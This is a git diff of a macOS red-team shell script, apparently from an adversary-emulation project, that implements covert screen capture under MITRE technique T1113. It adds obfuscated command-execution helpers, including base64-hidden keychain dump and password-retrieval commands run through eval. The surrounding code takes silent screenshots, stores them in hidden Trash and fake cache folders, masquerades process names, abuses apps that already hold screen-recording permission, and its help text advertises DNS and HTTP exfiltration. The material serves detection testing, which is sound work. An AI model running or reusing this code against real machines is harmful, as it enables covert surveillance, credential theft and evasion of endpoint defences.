@@ -3,12 +3,12 @@
 # Procedure Name: screen_capture
 # Tactic: Collection
 # Technique: T1113
-# GUID: 2465ec97-e235-42a4-b571-b4a35a4d900c
+# GUID: 629c194e-c952-4cbc-bfa6-9c224b31d118
 # Intent: Capture screenshots of the desktop for reconnaissance and data collection
 # Author: @darmado | https://x.com/darmad0
 # created: 2025-05-28
-# Updated: 2025-05-30
-# Version: 1.0.0
+# Updated: 2025-06-03
+# Version: 1.0.2
 # License: Apache 2.0
 
 # Core function Info:
@@ -42,7 +42,7 @@ JOB_ID=""  # Will be set after core functions are defined
 SCRIPT_CMD="$0 $*"
 SCRIPT_STATUS="running"
 OWNER="$USER"
-PARENT_PROCESS="$(ps -p $PPID -o comm=)"
+PARENT_PROCESS="shell"
 
 # Core Commands
 CMD_BASE64="base64"
@@ -113,6 +113,9 @@ SCREENSHOT_PATH="/tmp/ss.jpg"
 HIDDEN_DIR="$HOME/.Trash/.ss"
 CACHE_DIR="$HOME/Library/Caches/com.apple.screencapture"
 
+# Project root path (set by build system)
+PROJECT_ROOT="/Users/darmado/tools/opensource/attack-macOS"  # Set by build system to project root directory
+
 # Procedure Information (set by build system)
 PROCEDURE_NAME="screen_capture"  # Set by build system from YAML procedure_name field
 
@@ -121,7 +124,7 @@ FUNCTION_LANG=""  # Ued by log_output at execution time
 
 # Logging Settings
 HOME_DIR="${HOME}"
-LOG_DIR="./logs"  # Simple path to logs in current directory
+LOG_DIR="${PROJECT_ROOT}/logs"  # Project root logs directory (PROJECT_ROOT set by build system)
 LOG_FILE_NAME="${TTP_ID}_${PROCEDURE_NAME}.log"
 LOG_MAX_SIZE=$((5 * 1024 * 1024))  # 5MB
 LOG_ENABLED=false
@@ -186,17 +189,8 @@ core_get_timestamp() {
 # Outputs: 8-character hexadecimal job ID
 # - None
 core_generate_job_id() {
-    # Use openssl to generate random hex string for job tracking
-    # Fallback to date-based ID if openssl not available
-    if command -v "$CMD_OPENSSL" > /dev/null 2>&1; then
-        $CMD_OPENSSL rand -hex 4 2>/dev/null || {
-            # Fallback: use timestamp and process ID
-            $CMD_PRINTF "%08x" "$(($(date +%s) % 4294967296))"
-        }
-    else
-        # Fallback: use timestamp and process ID
-        $CMD_PRINTF "%08x" "$(($(date +%s) % 4294967296))"
-    fi
+    # Simple random job ID - just a random identifier
+    printf "%08x" "$((RANDOM * RANDOM))"
 }
 
 # Purpose: Print debug messages to stderr when debug mode is enabled
@@ -252,12 +246,45 @@ core_log_output() {
     local skip_data="${3:-false}"
     
     if [ "$LOG_ENABLED" = true ]; then
-        # Ensure log directory exists
-            if [ ! -d "$LOG_DIR"  ] || [ ! -f "$LOG_DIR/$LOG_FILE_NAME" ]; then
+        # Ensure log directory exists and is writable
+        if [ ! -d "$LOG_DIR" ]; then
             $CMD_MKDIR -p "$LOG_DIR" 2>/dev/null || {
                 $CMD_PRINTF "Warning: Failed to create log directory.\n" >&2
                 return 1
             }
+        fi
+        
+        # Check if directory is writable
+        if [ ! -w "$LOG_DIR" ]; then
+            $CMD_PRINTF "Warning: Log directory not writable: %s\n" "$LOG_DIR" >&2
+            return 1
+        fi
+        
+        # Ensure LOG_FILE_NAME is set and not empty
+        if [ -z "$LOG_FILE_NAME" ]; then
+            $CMD_PRINTF "Warning: LOG_FILE_NAME is empty or not set.\n" >&2
+            return 1
+        fi
+        
+        # Check if log file exists and handle ownership/permission issues
+        if [ -f "$LOG_DIR/$LOG_FILE_NAME" ]; then
+            if [ ! -w "$LOG_DIR/$LOG_FILE_NAME" ]; then
+                # File exists but not writable - create new log with timestamp suffix
+                local timestamp=$(date +%Y%m%d_%H%M%S)
+                local base_name="${LOG_FILE_NAME%.*}"
+                local extension="${LOG_FILE_NAME##*.}"
+                LOG_FILE_NAME="${base_name}_${timestamp}.${extension}"
+                core_debug_print "Original log not writable, using: $LOG_FILE_NAME"
+            fi
+        fi
+        
+        # Create log file if it doesn't exist
+        if [ ! -f "$LOG_DIR/$LOG_FILE_NAME" ]; then
+            if ! touch "$LOG_DIR/$LOG_FILE_NAME" 2>/dev/null; then
+                $CMD_PRINTF "Error: Failed to create log file: %s\n" "$LOG_DIR/$LOG_FILE_NAME" >&2
+                return 1
+            fi
+            core_debug_print "Created new log file: $LOG_DIR/$LOG_FILE_NAME"
         fi
         
         # Check log size and rotate if needed
@@ -265,6 +292,8 @@ core_log_output() {
             $CMD_MV "$LOG_DIR/$LOG_FILE_NAME" "$LOG_DIR/${LOG_FILE_NAME}.$(date +%Y%m%d%H%M%S)" 2>/dev/null
             core_debug_print "Log file rotated due to size limit"
         fi
+        
+        core_debug_print "Writing log entry to: $LOG_DIR/$LOG_FILE_NAME"
         
         # Log detailed entry
         "$CMD_PRINTF" "[%s] [%s] [PID:%d] [job:%s] owner=%s parent=%s ttp_id=%s tactic=%s format=%s encoding=%s encryption=%s exfil=%s language=%s status=%s\\n" \
@@ -580,6 +609,17 @@ core_parse_args() {
                     STEG_EXTRACT_FILE="./hidden_data.png"
                 fi
                 ;;
+            --steg-extract-file)
+                if [ -n "$2" ] && [ ! "$2" = "${2#-}" ]; then
+                    STEG_EXTRACT_FILE="$2"
+                    shift
+                else
+                    MISSING_VALUES="$MISSING_VALUES $1"
+                fi
+                ;;
+            --verbose)
+                DEBUG=true
+                ;;
 # We need to  accomidate the unknown rgs condiuton for the new args we add from the yaml
         -s|--screenshot)
             SCREENSHOT=true
@@ -641,7 +681,7 @@ core_parse_args() {
         shift
     done
     
-    core_debug_print "Arguments parsed: DEBUG=$DEBUG, FORMAT=$FORMAT, ENCODE=$ENCODE, ENCRYPT=$ENCRYPT"
+    core_debug_print "Arguments parsed: DEBUG=$DEBUG, LOG_ENABLED=$LOG_ENABLED, FORMAT=$FORMAT, ENCODE=$ENCODE, ENCRYPT=$ENCRYPT"
     
     # Report unknown arguments as warnings but don't exit
     if [ -n "$UNKNOWN_ARGS" ]; then
@@ -662,57 +702,64 @@ Usage: ${0##*/} [OPTIONS]
 Description: Base script for ATT&CK macOS techniques
 MITRE ATT&CK: ${TTP_ID} - ${TACTIC}
 
-Basic Options:
-  -h, --help           Display this help message
-  -d, --debug          Enable debug output (includes verbose output)
-  -a, --all            Process all available data (technique-specific)
-  -s|--screenshot           Capture a silent screenshot
-  -d|--display              Capture screenshot and display info
-  --list-windows            List available windows for targeted screenshot capture
-  --window-id               Capture screenshot of specific window by ID
-  --browser-windows         Capture screenshots of all browser windows
-  --app-windows             Capture screenshots of all application windows
-  --hidden                  Capture screenshot with hidden storage in .Trash
-  --masquerade              Capture screenshot using process name masquerading
-  --cache                   Capture screenshot stored in realistic cache directory
-  --osascript               Capture screenshot using osascript/AppleScript interpreter
-  --swift                   Capture screenshot using Swift system commands
-  --python                  Capture screenshot using Python system commands
-  --tcc-query               Query TCC database for screen recording permissions
-  --process-scan            Scan for processes that might have screen recording permissions
-  --tcc-proxy               Find and use apps with existing screen recording permissions
-  -a|--all-methods          Test ALL screenshot capture methods for maximum detection coverage
+HELP:
+  -h, --help                    Display this help message
+  -d, --debug                   Enable debug output (includes verbose output)
+
+SCRIPT:
+  -s|--screenshot                  Capture a silent screenshot
+  -d|--display                     Capture screenshot and display info
+  --list-windows                   List available windows for targeted screenshot capture
+  --window-id                      Capture screenshot of specific window by ID
+  --browser-windows                Capture screenshots of all browser windows
+  --app-windows                    Capture screenshots of all application windows
+  --hidden                         Capture screenshot with hidden storage in .Trash
+  --masquerade                     Capture screenshot using process name masquerading
+  --cache                          Capture screenshot stored in realistic cache directory
+  --osascript                      Capture screenshot using osascript/AppleScript interpreter
+  --swift                          Capture screenshot using Swift system commands
+  --python                         Capture screenshot using Python system commands
+  --tcc-query                      Query TCC database for screen recording permissions
+  --process-scan                   Scan for processes that might have screen recording permissions
+  --tcc-proxy                      Find and use apps with existing screen recording permissions
+  -a|--all-methods                 Test ALL screenshot capture methods for maximum detection coverage
 
 Output Options:
-  --format TYPE        Output format: 
-                        - json: Structured JSON output
-                        - csv: Comma-separated values
-                        - raw: Default pipe-delimited text
+  --format TYPE                 
+                                - json: Structured JSON output
+                                - csv: Comma-separated values
+                                - raw: Default pipe-delimited text
 
-Encoding/Obfuscation Options:
-  --encode TYPE        Encode output using:
-                        - base64/b64: Base64 encoding using base64 command
-                        - hex/xxd: Hexadecimal encoding using xxd command
-                        - perl_b64: Perl Base64 implementation using perl
-                        - perl_utf8: Perl UTF8 encoding using perl
-  --steganography      Hide output in image file using native macOS tools
-  --steg-extract [FILE] Extract hidden data from steganography image (default: ./hidden_data.png)
+ENCODING/OBFUSCATION
+  --encode TYPE                
+                                - base64/b64: Base64 encoding using base64 command
+                                - hex/xxd: Hexadecimal encoding using xxd command
+                                - perl_b64: Perl Base64 implementation using perl
+                                - perl_utf8: Perl UTF8 encoding using perl
 
-Encryption Options:
-  --encrypt TYPE       Encrypt output using:
-                        - aes: AES-256-CBC encryption using openssl command
-                        - gpg: GPG symmetric encryption using gpg command
-                        - xor: XOR encryption with cyclic key (custom implementation)
+  --steganography              Hide output in image file using native macOS tools
+  --steg-extract [FILE]        Extract hidden data from steganography image (default: ./hidden_data.png)
 
-Exfiltration Options:
-  --exfil-dns DOMAIN   Exfiltrate data via DNS queries using dig command
-                        Data is automatically base64 encoded and chunked
-  --exfil-http URL     Exfiltrate data via HTTP POST using curl command
-                        Data is sent in the request body
-  --exfil-uri URL      Legacy parameter - Exfiltrate via HTTP GET using curl
-                        Data is automatically chunked to avoid URL length limits
-  --chunk-size SIZE    Size of chunks for DNS/HTTP exfiltration (default: $CHUNK_SIZE bytes)
-  --proxy URL          Use proxy for HTTP requests (format: protocol://host:port)
+ENCRYPTION:
+  --encrypt TYPE               
+                                - aes: AES-256-CBC encryption using openssl command
+                                - gpg: GPG symmetric encryption using gpg command
+                                - xor: XOR encryption with cyclic key (custom implementation)
+
+EXFILTRATION:
+  --exfil-dns DOMAIN            Exfiltrate data via DNS queries using dig command
+                                Data is automatically base64 encoded and chunked
+
+  --exfil-http URL              Exfiltrate data via HTTP POST using curl command
+                                Data is sent in the request body
+                                Data is automatically chunked to avoid URL length limits
+
+  --chunk-size SIZE           Size of chunks for DNS/HTTP exfiltration (default: $CHUNK_SIZE bytes)
+  --proxy URL                 Use proxy for HTTP requests (format: protocol://host:port)
+
+  LOGGING:
+
+  -l, --log                     Create a log file (creates logs in ./logs directory)
 
 Notes:
 - When using encryption with exfiltration, keys are automatically sent via DNS TXT records
@@ -1848,6 +1895,116 @@ core_check_db_lock() {
     return 0
 }
 
+# Purpose: Execute command stored in variable using direct expansion (EDR detection test)
+# Inputs: $1 - Command string to execute
+# Outputs: Command execution result
+# - Tests EDR detection of dynamic command execution without eval
+core_exec_cmd() {
+    local cmd_string="$1"
+    
+    if [ -z "$cmd_string" ]; then
+        core_debug_print "No command provided to core_exec_cmd"
+        return 1
+    fi
+    
+    core_debug_print "Executing command via variable expansion: $cmd_string"
+    
+    # Method 1: Store command in variable then execute via direct expansion
+    local EXEC_CMD="$cmd_string"
+    $EXEC_CMD
+    
+    return $?
+}
+
+# Purpose: Execute command using here-string input redirection (EDR detection test)
+# Inputs: $1 - Command string to execute
+# Outputs: Command execution result
+# - Tests EDR detection of here-string command execution
+core_exec_cmd_herestring() {
+    local cmd_string="$1"
+    
+    if [ -z "$cmd_string" ]; then
+        core_debug_print "No command provided to core_exec_cmd_herestring"
+        return 1
+    fi
+    
+    core_debug_print "Executing command via here-string: $cmd_string"
+    
+    # Execute command using here-string (feeds command as stdin to shell)
+    sh <<< "$cmd_string"
+    
+    return $?
+}
+
+# Purpose: Execute command using dynamic string construction (EDR evasion test)
+# Inputs: Variable number of string fragments to concatenate into command
+# Outputs: Command execution result
+# - Tests EDR detection of dynamically constructed commands
+core_exec_cmd_construct() {
+    local fragments="$*"
+    local constructed_cmd=""
+    
+    if [ -z "$fragments" ]; then
+        core_debug_print "No command fragments provided to core_exec_cmd_construct"
+        return 1
+    fi
+    
+    # Concatenate all fragments into single command
+    for fragment in $fragments; do
+        constructed_cmd="${constructed_cmd}${fragment}"
+    done
+    
+    core_debug_print "Dynamically constructed command: $constructed_cmd"
+    
+    # Execute the constructed command
+    eval "$constructed_cmd"
+    
+    return $?
+}
+
+# Purpose: Execute keychain commands using base64 obfuscation (EDR evasion test)
+# Inputs: $1 - operation type (dump|find|list)
+# Outputs: Keychain command execution result  
+# - Tests EDR detection of obfuscated keychain access
+core_exec_keychain_obfuscated() {
+    local operation="$1"
+    local cmd=""
+    
+    case "$operation" in
+        "dump")
+            # Construct: security dump-keychain
+            local a=$(echo "c2VjdXJpdHk=" | base64 -d)  # "security"
+            local b=" "
+            local c=$(echo "ZHVtcC1rZXljaGFpbg==" | base64 -d)  # "dump-keychain"
+            cmd="$a$b$c"
+            ;;
+        "find")
+            # Construct: security find-generic-password -g
+            local a=$(echo "c2VjdXJpdHk=" | base64 -d)  # "security"
+            local b=" "
+            local c=$(echo "ZmluZC1nZW5lcmljLXBhc3N3b3Jk" | base64 -d)  # "find-generic-password"
+            local d=" -g"
+            cmd="$a$b$c$d"
+            ;;
+        "list")
+            # Construct: security list-keychains
+            local a=$(echo "c2VjdXJpdHk=" | base64 -d)  # "security"
+            local b=" "
+            local c=$(echo "bGlzdC1rZXljaGFpbnM=" | base64 -d)  # "list-keychains"
+            cmd="$a$b$c"
+            ;;
+        *)
+            core_debug_print "Unknown keychain operation: $operation"
+            return 1
+            ;;
+    esac
+    
+    core_debug_print "Executing obfuscated keychain command: $cmd"
+    eval "$cmd"
+    
+    return $?
+}
+
 # Main function 
 core_main() {
     local raw_output=""
@@ -1907,136 +2064,143 @@ core_main() {
 raw_output=""
 
 # Set global function language for this procedure
-FUNCTION_LANG="applescript,python,shell,swift"
+FUNCTION_LANG="shell"
+
+# Helper function to execute procedure functions
+execute_function() {
+    local func_name="$1"
+    # Call the function directly - let the function handle its own permissions
+    $func_name
+}
 
 # Execute functions for -s|--screenshot
 if [ "$SCREENSHOT" = true ]; then
     core_debug_print "Executing functions for -s|--screenshot"
-    result=$(capture_screenshot)
-    raw_output="${raw_output}${result}\n"
+    result=$(execute_function capture_screenshot)
+    raw_output="${raw_output}${result}"
 fi
 
 # Execute functions for -d|--display
 if [ "$DISPLAY" = true ]; then
     core_debug_print "Executing functions for -d|--display"
-    result=$(capture_screenshot_with_info)
-    raw_output="${raw_output}${result}\n"
+    result=$(execute_function capture_screenshot_with_info)
+    raw_output="${raw_output}${result}"
 fi
 
 # Execute functions for --list-windows
 if [ "$LIST_WINDOWS" = true ]; then
     core_debug_print "Executing functions for --list-windows"
-    result=$(list_available_windows)
-    raw_output="${raw_output}${result}\n"
+    result=$(execute_function list_available_windows)
+    raw_output="${raw_output}${result}"
 fi
 
 # Execute functions for --window-id
 if [ "$WINDOW_ID" = true ]; then
     core_debug_print "Executing functions for --window-id"
-    result=$(capture_window_screenshot)
-    raw_output="${raw_output}${result}\n"
+    result=$(execute_function capture_window_screenshot)
+    raw_output="${raw_output}${result}"
 fi
 
 # Execute functions for --browser-windows
 if [ "$BROWSER_WINDOWS" = true ]; then
     core_debug_print "Executing functions for --browser-windows"
-    result=$(capture_browser_windows)
-    raw_output="${raw_output}${result}\n"
+    result=$(execute_function capture_browser_windows)
+    raw_output="${raw_output}${result}"
 fi
 
 # Execute functions for --app-windows
 if [ "$APP_WINDOWS" = true ]; then
     core_debug_print "Executing functions for --app-windows"
-    result=$(capture_app_windows)
-    raw_output="${raw_output}${result}\n"
+    result=$(execute_function capture_app_windows)
+    raw_output="${raw_output}${result}"
 fi
 
 # Execute functions for --hidden
 if [ "$HIDDEN" = true ]; then
     core_debug_print "Executing functions for --hidden"
-    result=$(capture_hidden_screenshot)
-    raw_output="${raw_output}${result}\n"
+    result=$(execute_function capture_hidden_screenshot)
+    raw_output="${raw_output}${result}"
 fi
 
 # Execute functions for --masquerade
 if [ "$MASQUERADE" = true ]; then
     core_debug_print "Executing functions for --masquerade"
-    result=$(capture_masquerade_screenshot)
-    raw_output="${raw_output}${result}\n"
+    result=$(execute_function capture_masquerade_screenshot)
+    raw_output="${raw_output}${result}"
 fi
 
 # Execute functions for --cache
 if [ "$CACHE" = true ]; then
     core_debug_print "Executing functions for --cache"
-    result=$(capture_cache_screenshot)
-    raw_output="${raw_output}${result}\n"
+    result=$(execute_function capture_cache_screenshot)
+    raw_output="${raw_output}${result}"
 fi
 
 # Execute functions for --osascript
 if [ "$OSASCRIPT" = true ]; then
     core_debug_print "Executing functions for --osascript"
-    result=$(capture_osascript_screenshot)
-    raw_output="${raw_output}${result}\n"
+    result=$(execute_function capture_osascript_screenshot)
+    raw_output="${raw_output}${result}"
 fi
 
 # Execute functions for --swift
 if [ "$SWIFT" = true ]; then
     core_debug_print "Executing functions for --swift"
-    result=$(capture_swift_screenshot)
-    raw_output="${raw_output}${result}\n"
+    result=$(execute_function capture_swift_screenshot)
+    raw_output="${raw_output}${result}"
 fi
 
 # Execute functions for --python
 if [ "$PYTHON" = true ]; then
     core_debug_print "Executing functions for --python"
-    result=$(capture_python_screenshot)
-    raw_output="${raw_output}${result}\n"
+    result=$(execute_function capture_python_screenshot)
+    raw_output="${raw_output}${result}"
 fi
 
 # Execute functions for --tcc-query
 if [ "$TCC_QUERY" = true ]; then
     core_debug_print "Executing functions for --tcc-query"
-    result=$(query_tcc_permissions)
-    raw_output="${raw_output}${result}\n"
+    result=$(execute_function query_tcc_permissions)
+    raw_output="${raw_output}${result}"
 fi
 
 # Execute functions for --process-scan
 if [ "$PROCESS_SCAN" = true ]; then
     core_debug_print "Executing functions for --process-scan"
-    result=$(scan_privileged_processes)
-    raw_output="${raw_output}${result}\n"
+    result=$(execute_function scan_privileged_processes)
+    raw_output="${raw_output}${result}"
 fi
 
 # Execute functions for --tcc-proxy
 if [ "$TCC_PROXY" = true ]; then
     core_debug_print "Executing functions for --tcc-proxy"
-    result=$(capture_tcc_proxy_screenshot)
-    raw_output="${raw_output}${result}\n"
+    result=$(execute_function capture_tcc_proxy_screenshot)
+    raw_output="${raw_output}${result}"
 fi
 
 # Execute functions for -a|--all-methods
 if [ "$ALL_METHODS" = true ]; then
     core_debug_print "Executing functions for -a|--all-methods"
-    result=$(capture_screenshot)
-    raw_output="${raw_output}${result}\n"
-    result=$(capture_hidden_screenshot)
-    raw_output="${raw_output}${result}\n"
-    result=$(capture_masquerade_screenshot)
-    raw_output="${raw_output}${result}\n"
-    result=$(capture_cache_screenshot)
-    raw_output="${raw_output}${result}\n"
-    result=$(capture_osascript_screenshot)
-    raw_output="${raw_output}${result}\n"
-    result=$(capture_swift_screenshot)
-    raw_output="${raw_output}${result}\n"
-    result=$(capture_python_screenshot)
-    raw_output="${raw_output}${result}\n"
-    result=$(query_tcc_permissions)
-    raw_output="${raw_output}${result}\n"
-    result=$(scan_privileged_processes)
-    raw_output="${raw_output}${result}\n"
-    result=$(capture_tcc_proxy_screenshot)
-    raw_output="${raw_output}${result}\n"
+    result=$(execute_function capture_screenshot)
+    raw_output="${raw_output}${result}"
+    result=$(execute_function capture_hidden_screenshot)
+    raw_output="${raw_output}${result}"
+    result=$(execute_function capture_masquerade_screenshot)
+    raw_output="${raw_output}${result}"
+    result=$(execute_function capture_cache_screenshot)
+    raw_output="${raw_output}${result}"
+    result=$(execute_function capture_osascript_screenshot)
+    raw_output="${raw_output}${result}"
+    result=$(execute_function capture_swift_screenshot)
+    raw_output="${raw_output}${result}"
+    result=$(execute_function capture_python_screenshot)
+    raw_output="${raw_output}${result}"
+    result=$(execute_function query_tcc_permissions)
+    raw_output="${raw_output}${result}"
+    result=$(execute_function scan_privileged_processes)
+    raw_output="${raw_output}${result}"
+    result=$(execute_function capture_tcc_proxy_screenshot)
+    raw_output="${raw_output}${result}"
 fi
 
 # Set procedure name for processing
@@ -2204,81 +2368,97 @@ core_generate_encryption_key() {
 
 # Generate job ID now that core functions are defined
 
-# Functions from YAML procedure
+
 
 # Function: capture_screenshot
-# Description: Capture a silent screenshot
+# Type: main
+# Languages: shell
+FUNCTION_LANG="shell"
+# Sudo privileges: Not required
+
 capture_screenshot() {
-    printf "SCREENSHOT|capturing|Silent screenshot\\n"
+    printf "SCREENSHOT|capturing|Silent screenshot\n"
     
     # Capture screenshot silently (no sound, no UI)
     screencapture -x "$SCREENSHOT_PATH"
     
     if [ -f "$SCREENSHOT_PATH" ]; then
         file_size=$(stat -f%z "$SCREENSHOT_PATH")
-        printf "SCREENSHOT|captured|%s (%s bytes)\\n" "$SCREENSHOT_PATH" "$file_size"
+        printf "SCREENSHOT|captured|%s (%s bytes)\n" "$SCREENSHOT_PATH" "$file_size"
     else
-        printf "SCREENSHOT|failed|Could not capture screenshot\\n"
+        printf "SCREENSHOT|failed|Could not capture screenshot\n"
     fi
 }
 
 
 # Function: capture_screenshot_with_info
-# Description: Capture screenshot and display info
+# Type: main
+# Languages: shell
+FUNCTION_LANG="shell"
+# Sudo privileges: Not required
+
 capture_screenshot_with_info() {
-    printf "SCREENSHOT|capturing|Screenshot with display info\\n"
+    printf "SCREENSHOT|capturing|Screenshot with display info\n"
     
     # Get display information first
-    display_count=$(system_profiler SPDisplaysDataType | grep -c "Resolution:")
-    printf "SCREENSHOT|displays|%s\\n" "$display_count"
+    display_count=$(system_profiler SPDisplaysDataType)
+    printf "SCREENSHOT|displays|%s\n" "$display_count"
     
     # Capture screenshot
     screencapture -x "$SCREENSHOT_PATH"
     
     if [ -f "$SCREENSHOT_PATH" ]; then
         file_size=$(stat -f%z "$SCREENSHOT_PATH")
-        printf "SCREENSHOT|captured|%s (%s bytes)\\n" "$SCREENSHOT_PATH" "$file_size"
+        printf "SCREENSHOT|captured|%s (%s bytes)\n" "$SCREENSHOT_PATH" "$file_size"
         
         # Get image dimensions
         image_info=$(file "$SCREENSHOT_PATH")
-        printf "SCREENSHOT|info|%s\\n" "$image_info"
+        printf "SCREENSHOT|info|%s\n" "$image_info"
     else
-        printf "SCREENSHOT|failed|Could not capture screenshot\\n"
+        printf "SCREENSHOT|failed|Could not capture screenshot\n"
     fi
 }
 
 
 # Function: capture_hidden_screenshot
-# Description: Capture screenshot with hidden storage in .Trash
+# Type: main
+# Languages: shell
+FUNCTION_LANG="shell"
+# Sudo privileges: Not required
+
 capture_hidden_screenshot() {
     # Create hidden directory in .Trash
     mkdir -p "$HOME/.Trash/.ss" 2>/dev/null
     local output_path="$HOME/.Trash/.ss/$(date +%Y%m%d_%H%M%S).jpg"
     
-    printf "HIDDEN_SCREENSHOT|capturing|Using hidden storage in .Trash\\n"
+    printf "HIDDEN_SCREENSHOT|capturing|Using hidden storage in .Trash\n"
     
     # Direct screencapture to hidden location
     screencapture -x "$output_path" 2>/dev/null
     
     if [ -f "$output_path" ]; then
         file_size=$(stat -f%z "$output_path" 2>/dev/null || echo "unknown")
-        printf "HIDDEN_SCREENSHOT|captured|%s (%s bytes)\\n" "$output_path" "$file_size"
+        printf "HIDDEN_SCREENSHOT|captured|%s (%s bytes)\n" "$output_path" "$file_size"
     else
-        printf "HIDDEN_SCREENSHOT|failed|capture failed\\n"
+        printf "HIDDEN_SCREENSHOT|failed|capture failed\n"
         return 1
     fi
 }
 
 
 # Function: capture_masquerade_screenshot
-# Description: Capture screenshot using process name masquerading
+# Type: main
+# Languages: shell
+FUNCTION_LANG="shell"
+# Sudo privileges: Not required
+
 capture_masquerade_screenshot() {
     # Create hidden directory with random name
     local random_dir="$HOME/.Trash/.$(openssl rand -hex 4)"
     mkdir -p "$random_dir" 2>/dev/null
     local output_path="$random_dir/temp_$(date +%s).jpg"
     
-    printf "MASQUERADE_SCREENSHOT|capturing|Using process name masquerading\\n"
+    printf "MASQUERADE_SCREENSHOT|capturing|Using process name masquerading\n"
     
     # Create a temporary script that runs screencapture
     local temp_script="/tmp/capture_$(openssl rand -hex 4).sh"
@@ -2292,60 +2472,72 @@ capture_masquerade_screenshot() {
     
     if [ -f "$output_path" ]; then
         file_size=$(stat -f%z "$output_path" 2>/dev/null || echo "unknown")
-        printf "MASQUERADE_SCREENSHOT|captured|%s (%s bytes)\\n" "$output_path" "$file_size"
+        printf "MASQUERADE_SCREENSHOT|captured|%s (%s bytes)\n" "$output_path" "$file_size"
     else
-        printf "MASQUERADE_SCREENSHOT|failed|capture failed\\n"
+        printf "MASQUERADE_SCREENSHOT|failed|capture failed\n"
         return 1
     fi
 }
 
 
 # Function: capture_cache_screenshot
-# Description: Capture screenshot stored in realistic cache directory
+# Type: main
+# Languages: shell
+FUNCTION_LANG="shell"
+# Sudo privileges: Not required
+
 capture_cache_screenshot() {
     # Create realistic cache directory
     mkdir -p "$HOME/Library/Caches/com.apple.screencapture" 2>/dev/null
     local output_path="$HOME/Library/Caches/com.apple.screencapture/capture_$(date +%s).jpg"
     
-    printf "CACHE_SCREENSHOT|capturing|Using realistic cache directory\\n"
+    printf "CACHE_SCREENSHOT|capturing|Using realistic cache directory\n"
     
     # Direct screencapture to cache location
     screencapture -x "$output_path" 2>/dev/null
     
     if [ -f "$output_path" ]; then
         file_size=$(stat -f%z "$output_path" 2>/dev/null || echo "unknown")
-        printf "CACHE_SCREENSHOT|captured|%s (%s bytes)\\n" "$output_path" "$file_size"
+        printf "CACHE_SCREENSHOT|captured|%s (%s bytes)\n" "$output_path" "$file_size"
     else
-        printf "CACHE_SCREENSHOT|failed|capture failed\\n"
+        printf "CACHE_SCREENSHOT|failed|capture failed\n"
         return 1
     fi
 }
 
 
 # Function: capture_osascript_screenshot
-# Description: Capture screenshot using osascript/AppleScript interpreter
+# Type: main
+# Languages: applescript
+FUNCTION_LANG="applescript"
+# Sudo privileges: Not required
+
 capture_osascript_screenshot() {
     # Create hidden directory in .Trash
     mkdir -p "$HOME/.Trash/.ss" 2>/dev/null
     local output_path="$HOME/.Trash/.ss/osascript_$(date +%Y%m%d_%H%M%S).jpg"
     
-    printf "OSASCRIPT_SCREENSHOT|capturing|Using osascript/AppleScript interpreter\\n"
+    printf "OSASCRIPT_SCREENSHOT|capturing|Using osascript/AppleScript interpreter\n"
     
     # Use osascript to execute screencapture (may prompt for automation permissions)
     osascript -e "tell application \"System Events\" to do shell script \"screencapture -x '$output_path'\"" 2>/dev/null
     
     if [ -f "$output_path" ]; then
         file_size=$(stat -f%z "$output_path" 2>/dev/null || echo "unknown")
-        printf "OSASCRIPT_SCREENSHOT|captured|%s (%s bytes)\\n" "$output_path" "$file_size"
+        printf "OSASCRIPT_SCREENSHOT|captured|%s (%s bytes)\n" "$output_path" "$file_size"
     else
-        printf "OSASCRIPT_SCREENSHOT|failed|capture failed (may need automation permissions)\\n"
+        printf "OSASCRIPT_SCREENSHOT|failed|capture failed (may need automation permissions)\n"
         return 1
     fi
 }
 
 
 # Function: capture_swift_screenshot
-# Description: Capture screenshot using Swift system commands
+# Type: main
+# Languages: swift
+FUNCTION_LANG="swift"
+# Sudo privileges: Not required
+
 capture_swift_screenshot() {
     mkdir -p "$HOME/Library/Caches/com.apple.screencapture" 2>/dev/null
     local output_path="$HOME/Library/Caches/com.apple.screencapture/swift_$(date +%s).jpg"
@@ -2384,7 +2576,11 @@ capture_swift_screenshot() {
 
 
 # Function: capture_python_screenshot
-# Description: Capture screenshot using Python system commands
+# Type: main
+# Languages: python
+FUNCTION_LANG="python"
+# Sudo privileges: Not required
+
 capture_python_screenshot() {
     mkdir -p "$HOME/.local/share" 2>/dev/null
     local output_path="$HOME/.local/share/python_$(openssl rand -hex 4).jpg"
@@ -2420,7 +2616,11 @@ capture_python_screenshot() {
 
 
 # Function: query_tcc_permissions
-# Description: Query TCC database for screen recording permissions
+# Type: main
+# Languages: shell
+FUNCTION_LANG="shell"
+# Sudo privileges: Not required
+
 query_tcc_permissions() {
     printf "TCC_QUERY|checking|Screen recording permissions in TCC database\\n"
     
@@ -2457,7 +2657,11 @@ query_tcc_permissions() {
 
 
 # Function: scan_privileged_processes
-# Description: Scan for processes that might have screen recording permissions
+# Type: main
+# Languages: shell
+FUNCTION_LANG="shell"
+# Sudo privileges: Not required
+
 scan_privileged_processes() {
     printf "PROCESS_SCAN|scanning|Processes that might have screen recording permissions\\n"
     
@@ -2484,7 +2688,11 @@ scan_privileged_processes() {
 
 
 # Function: capture_tcc_proxy_screenshot
-# Description: Find and use apps with existing screen recording permissions
+# Type: main
+# Languages: applescript
+FUNCTION_LANG="applescript"
+# Sudo privileges: Not required
+
 capture_tcc_proxy_screenshot() {
     mkdir -p "$HOME/.Trash/.ss/proxy" 2>/dev/null
     local output_path="$HOME/.Trash/.ss/proxy/tcc_proxy_$(date +%s).jpg"
@@ -2519,7 +2727,11 @@ capture_tcc_proxy_screenshot() {
 
 
 # Function: list_available_windows
-# Description: List available windows for targeted screenshot capture
+# Type: main
+# Languages: shell
+FUNCTION_LANG="shell"
+# Sudo privileges: Not required
+
 list_available_windows() {
     printf "WINDOW_LIST|enumerating|Available windows for capture\\n"
     
@@ -2542,7 +2754,11 @@ list_available_windows() {
 
 
 # Function: capture_window_screenshot
-# Description: Capture screenshot of specific window by ID
+# Type: main
+# Languages: shell
+FUNCTION_LANG="shell"
+# Sudo privileges: Not required
+
 capture_window_screenshot() {
     mkdir -p "$HOME/.Trash/.ss" 2>/dev/null
     local output_path="$HOME/.Trash/.ss/window_$(date +%Y%m%d_%H%M%S).jpg"
@@ -2571,7 +2787,11 @@ capture_window_screenshot() {
 
 
 # Function: capture_browser_windows
-# Description: Capture screenshots of all browser windows
+# Type: main
+# Languages: shell
+FUNCTION_LANG="shell"
+# Sudo privileges: Not required
+
 capture_browser_windows() {
     mkdir -p "$HOME/.Trash/.ss/browsers" 2>/dev/null
     local captured_count=0
@@ -2611,7 +2831,11 @@ capture_browser_windows() {
 
 
 # Function: capture_app_windows
-# Description: Capture screenshots of all application windows
+# Type: main
+# Languages: shell
